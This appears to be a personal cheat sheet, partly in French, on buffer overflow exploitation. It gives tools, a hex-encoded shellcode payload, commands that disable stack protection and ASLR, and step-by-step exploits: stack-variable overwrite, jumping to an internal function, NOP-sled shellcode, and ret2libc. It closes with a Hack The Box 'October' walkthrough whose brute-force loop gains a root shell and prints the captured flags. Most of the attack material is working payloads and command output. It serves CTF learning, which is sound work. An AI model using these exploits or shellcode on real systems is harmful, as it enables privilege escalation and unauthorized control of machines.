# Buffer overflow

</br>

## Tools

* Plugin pour gdb : https://github.com/longld/peda
* string xxx
* test eax, eax : caracteristique des comparaisons de strings
* objdump -D buffer_01
* strace
* pmap `pidof xxx`
* PwnTools 
* /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 2000
* /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 0x41424344
* https://github.com/JonathanSalwan/ROPgadget
* $ for i in `seq 1 100`; do echo $i; ./simple $(python -c "print 'A'*$i"); done

</br>

### Payloads

#### dash
````
"\xeb\x11\x5e\x31\xc9\xb1\x32\x80\x6c\x0e\xff\x01\x80\xe9\x01\x75\xf6\xeb\x05\xe8\xea\xff\xff\xff\x32\xc1\x51\x69\x30\x30\x74\x69\x69\x30\x63\x6a\x6f\x8a\xe4\x51\x54\x8a\xe2\x9a\xb1\x0c\xce\x81"
````

</br>

### Disable securities

````
gcc -fno-stack-protector -z execstack 
Disable ASLR for one binary : setarch `uname -m` -R /root/mybinary
Disable ASLR for the session : echo 0 > /proc/sys/kernel/randomize_va_space
0: off
1: on
2: on (default value)
Disable ASLR:
sysctl -w kernel.randomize_va_space=0 in /etc/sysctl.conf
````

#### compile 32 bit on 64 bit platform

````
apt-get install gcc-multilib
gcc -m32
````

</br>

### gdb

#### Find system address

* source /usr/share/gdb-peda/peda.py
* r
* print system
* find "/bin/sh" all
* x/s *((char **)environ)

* break main
* clear

````
// gcc -m32 -std=c99 tst.c
//

#include <stdio.h>
#include <string.h>

int main(void)
{
    char s[] = "/bin/sh";
    char *p = (char *) 0xbffff000;

    // Get system addr from gdb
    p = (char *)0xf7e0c980;

    while (memcmp(++p, s, sizeof s));

    printf("%s\n", p);
    printf("%p\n", p);
}
````


</br>

## Simple buffer overflow : overwrite a stack variable

````
$ cat buffer_01.c
#include <stdio.h>
#include <string.h>
int main(int argc, char *argv[])
{
  char  tst=0;
  char name[10];

  strcpy(name, argv[1]);
  printf("Hello %s\n", name);
  if (tst=='Z') printf("Pwnd");
  return 0;
}
$ gcc -fno-stack-protector buffer_01.c -o buffer_01
$ buffer_01 ZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZ
````

</br>

## Internal function call

On regarde les fonctions et leurs adresses
````
$ objdump -D ./strcpy
08048533 <get_flag_1>:
 8048533:	55                   	push   %ebp
 8048534:	89 e5                	mov    %esp,%ebp
 8048536:	83 ec 08             	sub    $0x8,%esp
 8048539:	83 ec 0c             	sub    $0xc,%esp
 804853c:	68 20 86 04 08       	push   $0x8048620
 8048541:	e8 1a fe ff ff       	call   8048360 <system@plt>
 8048546:	83 c4 10             	add    $0x10,%esp
 8048549:	c9                   	leave
 804854a:	c3                   	ret

0804854b <get_flag_2>:
 804854b:	55                   	push   %ebp
 804854c:	89 e5                	mov    %esp,%ebp
 804854e:	83 ec 08             	sub    $0x8,%e
````
get_flag_2 est en 0804854b, on va pousser 0804854b en bout de notre fuzzer, et le faire glisser jusqu'à ce qu'il tombe sur EIP et appelle la fonction get_flag_2
````
$ for i in `seq 1 100`;do echo $i; ./strcpy $(python -c "print 'a'*$i+'\x4b\x85\x04\x08';"); done
````

</br>

## Execute stack payload : before ESP

Context:
- Executable stack
- No canary
- No Address Space Layout Randomization
=> Adresses are hard coded in elf

gcc -z execstack 


Detection à la louche de l'overflow en shell
````
$ for i in `seq 500 510`;do echo $i; ./vuln_basic $(python -c "print 'a'*$i;"); done
````

Detection fine de la position dans gdb
````
gdb
disassemble main
break *0x0804844e
gdb-peda$ run $(python -c "print 'a'*512+'bcdefghijklmnopqrst';")
Stopped reason: SIGSEGV
0x65646362 in ?? ()
=> bcde
gdb-peda$ x/520x $esp
````

On dispose de 512 octets. On va utiliser (512-48) NOP et une payload de 48 octets suivi d'une adresse 1234.
````
 run $(python -c 'print "\x90"*(512-48)+"\xeb\x11\x5e\x31\xc9\xb1\x32\x80\x6c\x0e\xff\x01\x80\xe9\x01\x75\xf6\xeb\x05\xe8\xea\xff\xff\xff\x32\xc1\x51\x69\x30\x30\x74\x69\x69\x30\x63\x6a\x6f\x8a\xe4\x51\x54\x8a\xe2\x9a\xb1\x0c\xce\x81"+"\x01\x02\x03\x04";')
 ````
On vérifie que EIP vaut bien 4x3x2x1
On cherche avec x/520x $esp une adresse dans les nop
"bffffd50"
On l'inverse
"\x50\xfd\xff\xbf" 

On quitte gdb et on fait en shell
````
./vuln_basic  $(python -c 'print "\x90"*(512-48)+"\xeb\x11\x5e\x31\xc9\xb1\x32\x80\x6c\x0e\xff\x01\x80\xe9\x01\x75\xf6\xeb\x05\xe8\xea\xff\xff\xff\x32\xc1\x51\x69\x30\x30\x74\x69\x69\x30\x63\x6a\x6f\x8a\xe4\x51\x54\x8a\xe2\x9a\xb1\x0c\xce\x81"+"\x50\xfd\xff\xbf";')
$ id
uid=1001(user) gid=1001(user) euid=1000(chall) groups=1001(user)
````

</br>

## Execute stack payload : after ESP


On se le refait mais avec la payload après EIP
````
./vuln_basic  $(python -c 'print "\x90"*(512)+"\xc8\xfd\xff\xbf"+"\x90"*100+"\xeb\x11\x5e\x31\xc9\xb1\x32\x80\x6c\x0e\xff\x01\x80\xe9\x01\x75\xf6\xeb\x05\xe8\xea\xff\xff\xff\x32\xc1\x51\x69\x30\x30\x74\x69\x69\x30\x63\x6a\x6f\x8a\xe4\x51\x54\x8a\xe2\x9a\xb1\x0c\xce\x81";')
````

</br>

## Stack/Heap non executable -> return to LibC

HTB-October


```
#!/usr/bin/python
import os
import struct

libc_system = struct.pack('<I', 0xaeaeaeae)
libc_binsh  = struct.pack('<I', 0xaeaeaeae)

buffer  = 'A'*64
buffer += libc_system
buffer += 'AAAA'
buffer += libc_binsh

progname ="./buffer_01"
os.environ['VAR']=buffer
os.execve(progname, [progname], os.environ)

````
for i in `seq 60 99`; do ./simple  $(python -c "print 'A'*$i+'\x80\xc9\xe0\xf7'+'\xb0\xf9\xdf\xf7'+'\xaa\xca\xf4\xf7';"); done


</br>

## Hide LibC adresse ALSR 32 bits -> bruteforce search 



</br>

## Hide LibC adresse ALSR 64 bits -> information leak (format string vuln)


</br>

## LibC hidden -> Return Oriented Program (ROP)

https://github.com/0vercl0k/rp

</br>

## Randomize location of code -> Blind ROP

[http://www.scs.stanford.edu/brop/]




## HTB - october Ret2LibC with ALSR



## /usr/local/bin/ovrflw

ASLR: cat /proc/sys/kernel/va_randomize_space => 2 ALSR on
NX bit: readelf -W -l <bin> 2>/dev/null | grep ‘GNU_STACK’ | grep -q ‘RWE’ 
Stack not executable

=> Ret2LibC


```$ for i in `seq 100 120`; do echo $i; /usr/local/bin/ovrflw $(python -c "print 'A'*$i"); done;
<o echo $i; /usr/local/bin/ovrflw $(python -c "print 'A'*$i"); done;         
100
101
102
103
104
105
106
107
108
109
110
111
112
Segmentation fault (core dumped)
113
Segmentation fault (core dumped)
114
```
```
for i in `seq 110 120`; do echo $i; gdb -batch -ex='run' -args /usr/local/bin/ovrflw $(python -c "print 'A'*$i+'BBBB'"); done; 
$ for i in `seq 110 120`; do echo $i; gdb -batch -ex='run' -args /usr/local/bin/ovrflw $(python -c "print 'A'*$i+'BBBB'"); done
<'run' -args /usr/local/bin/ovrflw $(python -c "print 'A'*$i+'BBBB'"); done  
110

Program received signal SIGSEGV, Segmentation fault.
0xb7004242 in ?? ()
111

Program received signal SIGSEGV, Segmentation fault.
0x00424242 in ?? ()
112

Program received signal SIGSEGV, Segmentation fault.
0x42424242 in ?? ()
113

Program received signal SIGSEGV, Segmentation fault.
0x42424241 in ?? ()
114

```
Offset = 112

objdump -d /usr/local/bin/ovrflw | grep esp | grep jmp

```
 strings -a -t x  /lib/i386-linux-gnu/libc.so.6  | grep bin
< strings -a -t x  /lib/i386-linux-gnu/libc.so.6  | grep bin                 
   dff5 bindtextdomain
   f121 bindresvport
   fa8c bind
  10492 _nl_domain_bindings
  125bf bind_textdomain_codeset
 162bac /bin/sh
 163b8d invalid fastbin entry (free)
 1645d3 /bin:/usr/bin
 164b10 /bin/csh
 165fc7 /etc/bindresvport.blacklist
 1683a0 malloc(): smallbin double linked list corrupted
 168500 (old_top == (((mbinptr) (((char *) &((av)->bins[((1) - 1) * 2])) - __builtin_offsetof (struct malloc_chunk, fd)))) && old_size == 0) || ((unsigned long) (old_size) >= (unsigned long)((((__builtin_offsetof (struct malloc_chunk, fd_nextsize))+((2 *(sizeof(size_t))) - 1)) & ~((2 *(sizeof(size_t))) - 1))) && ((old_top)->size & 0x1) && ((unsigned long) old_end & pagemask) == 0)
```
/bin/sh is at 0x8014.

```
 readelf -s  /lib/i386-linux-gnu/libc.so.6 | grep system
< readelf -s  /lib/i386-linux-gnu/libc.so.6 | grep system                    
   243: 0011b710    73 FUNC    GLOBAL DEFAULT   12 svcerr_systemerr@@GLIBC_2.0
   620: 00040310    56 FUNC    GLOBAL DEFAULT   12 __libc_system@@GLIBC_PRIVATE
  1443: 00040310    56 FUNC    WEAK   DEFAULT   12 system@@GLIBC_2.0
```
system is at 0x40310

```
ovrflw Ret to libc
I’ll find an address of libc:

www-data@october:/dev/shm$ ldd /usr/local/bin/ovrflw | grep libc
        libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0xb75 f8 000)
$ ldd /usr/local/bin/ovrflw | grep libc
	libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0xb75 63 000)
$ ldd /usr/local/bin/ovrflw | grep libc
	libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0xb75 d5 000)

And I can get offsets for system, exit, and bin/sh:

www-data@october:/dev/shm$ readelf -s /lib/i386-linux-gnu/libc.so.6 | grep -e " system@" -e " exit@"
   139: 00033260    45 FUNC    GLOBAL DEFAULT   12 exit@@GLIBC_2.0
  1443: 00040310    56 FUNC    WEAK   DEFAULT   12 system@@GLIBC_2.0
www-data@october:/dev/shm$ strings -a -t x /lib/i386-linux-gnu/libc.so.6 | grep "/bin/" 
 162bac /bin/sh
 164b10 /bin/csh
For this libc base (which is right 1/512 times):

exit: 0xb75f8000+0x33260 = 0xB762B260
system: 0xb75f8000+0x40310 = 0xB7638310
/bin/sh: = 0xb75f8000+0x162bac = 0xB775ABAC
```

Our payload will look like this: “112 As then the address of system then 4 bytes of junk and finally the address of /bin/sh”
To calculate the address of system and /bin/sh I simply took the address of the libc from ldd directly and used it at the base. Then you just do the sum of base + system and base + /bin/sh like we saw above.


```
while true; do /usr/local/bin/ovrflw $(python -c 'print "A" * 112 + "\x10\xb3\x5b\xb7" + "A" * 4 + "\xac\xdb\x6d\xb7"');sleep 0.1;done
Les deux loop fonctionnent...
```
```
while true; do /usr/local/bin/ovrflw $(python -c 'print "\x90"*112 + "\x10\x83\x63\xb7" + "\x60\xb2\x62\xb7" + "\xac\xab\x75\xb7"'); done
Segmentation fault (core dumped)
Segmentation fault (core dumped)
Segmentation fault (core dumped)
Segmentation fault (core dumped)
Segmentation fault (core dumped)
Segmentation fault (core dumped)
Trace/breakpoint trap (core dumped)

ls
dr.php5
shell.php5
id
uid=33(www-data) gid=33(www-data) euid=0(root) groups=0(root),33(www-data)
cat /home/harry/user.txt
29161ca87aa3d34929dc46efc40c89c0
cat /root/root.txt
6bcb9cff749c9318d2a6e71bbcf30318

```







